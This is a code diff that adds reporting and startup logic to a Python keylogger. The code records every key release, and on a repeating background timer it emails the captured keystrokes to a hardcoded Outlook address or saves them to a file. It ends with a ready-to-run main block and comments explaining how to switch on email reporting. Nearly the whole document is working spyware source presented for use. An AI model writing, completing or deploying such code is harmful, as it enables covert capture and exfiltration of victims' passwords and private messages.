@@ -12,6 +12,8 @@ SEND_REPORT_EVERY = 60 # Report Keylogs every 60 seconds
 EMAIL_ADDRESS = "devbranch2point0@outlook.com"
 EMAIL_PASSWORD = ""
 
+
+
 class Keylogger:
     def __init__(self, interval, report_method="email"):
         # Pass SEND_REPORT_EVERY to interval
@@ -89,4 +91,47 @@ class Keylogger:
         server.quit()
         if verbose:
             print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
-            
+
+    # Method to report keylogs after every period of time. Calls sendmail() or report_to_file() every time.
+    def report(self):
+        # This function gets called every 'self.interval'. Sends keylogs and resets 'self.log' variable.
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update 'self.filename'
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread dies)
+        timer.daemon = True 
+        # start the timer
+        timer.start()
+
+    # Define the method that calls the on_release() method
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+
+if __name__ == "__main__":
+        # if you want a keylogger to send to your email
+        # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+        # if you want a kelogger to record keylogs to a local file
+        # (and then send it using your favorite method)
+        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+        keylogger.start()
+
+    # if you want reports via email, then you should uncomment the first instantiation of report_method="email"
